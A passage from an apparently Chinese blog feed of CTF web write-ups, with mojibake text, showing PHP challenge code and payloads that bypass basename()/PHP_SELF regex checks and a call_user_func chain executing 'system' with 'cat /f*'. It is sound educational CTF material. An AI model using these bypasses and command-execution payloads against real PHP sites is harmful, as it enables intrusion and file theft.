</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$path</span>); </span><br></pre></td></tr></table></figure><p>è¾“å‡º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geeksforgeeks.php</span><br></pre></td></tr></table></figure><h1 id="é¹¤åŸæ¯-2021-EasyP"><a href="#é¹¤åŸæ¯-2021-EasyP" class="headerlink" title="[é¹¤åŸæ¯ 2021]EasyP"></a>[é¹¤åŸæ¯ 2021]EasyP</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$guess</span> === <span class="variable">$secret</span>) &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Wrong. Try Again&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show_source/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>é¦–å…ˆçœ‹ç¬¬ä¸€ä¸ªæ­£åˆ™åˆ¤æ–­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$_SERVER[â€˜PHP_SELFâ€™]çš„å€¼ä¼šèµ‹ç»™basename()å‡½æ•°</p><p>ä½†æ˜¯åœ¨é»˜è®¤ç¯å¢ƒä¸­basename()ä¼šåˆ é™¤æ–‡ä»¶åå¼€å¤´éASCIIå­—ç¬¦å’Œä¸­æ–‡</p><p>å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥ç»•è¿‡è¿™å±‚æ­£åˆ™åˆ¤æ–­</p><p>ç»§ç»­çœ‹ç¬¬äºŒä¸ªæ­£åˆ™åˆ¤æ–­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show_source/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>URLç¼–ç ç»•è¿‡</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28090/index.php/utils.php/å§æ§½?%73how_source</span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬ä¼ å…¥index.php&#x2F;utils.php&#x2F;æ—¶basename()å‡½æ•°ä¼šå°†å…¶è§£ææˆutils.phpï¼Œè€Œè¿™é‡Œçš„å§æ§½æ˜¯ç»•è¿‡ç¬¬ä¸€ä¸ªæ­£åˆ™ï¼Œbasename()ä¼šå°†å…¶åˆ é™¤ï¼Œè€Œ%73æ˜¯ä¸ºäº†ç»•è¿‡ç¬¬äºŒä¸ªæ­£åˆ™ã€‚</p><p><img src="/../images/image-20231219190928665.png" alt="image-20231219190928665"></p><h1 id="ç¢å…‰æ¯-2023-å¤©å‘½ä¹‹å­"><a href="#ç¢å…‰æ¯-2023-å¤©å‘½ä¹‹å­" class="headerlink" title="[ç¢å…‰æ¯ 2023] å¤©å‘½ä¹‹å­"></a>[ç¢å…‰æ¯ 2023] å¤©å‘½ä¹‹å­</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sou_rc.e&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ars</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="variable">$sec</span>=<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">100000</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$sec</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$ars</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§£é¢˜æ€è·¯è·Ÿä¸Šé¢˜ä¸€æ ·</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/flag.php/å§æ§½?sou[rc.e</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SERVERå‚æ•°å’Œbasenameå‡½æ•°ç»•è¿‡&quot;&gt;&lt;a href=&quot;#SERVERå‚æ•°å’Œbasenameå‡½æ•°ç»•è¿‡&quot; class=&quot;headerlink&quot; title=&quot;$_SERVERå‚æ•°å’Œbasenameå‡½æ•°ç»•è¿‡&quot;&gt;&lt;/a&gt;$_SERVERå‚æ•°å’Œbasenameå‡½æ•°</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ç¢å…‰æ¯æ–°ç”Ÿèµ›wp(web)</title>
    <link href="http://example.com/2023/12/15/%E7%90%A2%E5%85%89%E6%9D%AF%E6%96%B0%E7%94%9F%E8%B5%9Bwp-web/"/>
    <id>http://example.com/2023/12/15/%E7%90%A2%E5%85%89%E6%9D%AF%E6%96%B0%E7%94%9F%E8%B5%9Bwp-web/</id>
    <published>2023-12-15T11:42:17.000Z</published>
    <updated>2023-12-15T11:43:25.759Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å¤©å‘½ä¹‹å­"><a href="#å¤©å‘½ä¹‹å­" class="headerlink" title="å¤©å‘½ä¹‹å­"></a>å¤©å‘½ä¹‹å­</h1><p>æ‰“å¼€ç¯å¢ƒ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ &quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sou_rc.e&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br>    <br>    <br>    <br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-variable">$ars</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$sec</span>=<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100000</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$sec</span>)==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$ars</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>basename+æ­£åˆ™ç»•è¿‡</p><p>è„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">255</span>;<span class="hljs-variable">$i</span>++)&#123;<br><span class="hljs-variable">$s</span>=<span class="hljs-string">&#x27;/index.php/config.php/&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$s</span>))&#123;<br><span class="hljs-variable">$t</span>=<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-string">&#x27;/index.php/config.php/&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(i));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;$&#123;i&#125;:$&#123;t&#125;\n&quot;</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">/<span class="hljs-keyword">index</span>.php/flag.php/<span class="hljs-title function_">%ff</span>?sou[rc.e<br></code></pre></td></tr></table></figure><p><img src="/../images/image-20231215190234449.png" alt="image-20231215190234449"></p><h1 id="phpæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€"><a href="#phpæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€" class="headerlink" title="phpæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€"></a>phpæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€</h1><p>æ‰“å¼€ç¯å¢ƒ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$action</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>];<br><span class="hljs-variable">$parameters</span> = <span class="hljs-variable">$_GET</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$parameters</span>[<span class="hljs-string">&#x27;action&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$parameters</span>[<span class="hljs-string">&#x27;action&#x27;</span>]);<br>&#125;<br><br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$action</span>, <span class="hljs-variable">$parameters</span>)(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>])(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>currentä¼šè¾“å‡ºæ•°ç»„å½“å‰å…ƒç´ å€¼</p><p>payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">action</span>=current&amp;a=current<br>POST:<br>a[]=system&amp;<span class="hljs-attribute">b</span>=cat /f*<br></code></pre></td></tr></table></figure><p><img src="/../images/image-20231215190559981.png" alt="image-20231215190559981"></p><h1 id="serialize-escape"><a href="#serialize-escape" class="headerlink" title="serialize_escape"></a>serialize_escape</h1><p>æç¤º<a href="http://www.zipæœ‰å¥½ä¸œè¥¿/">www.zipæœ‰å¥½ä¸œè¥¿</a></p><p>ä¸‹è½½</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 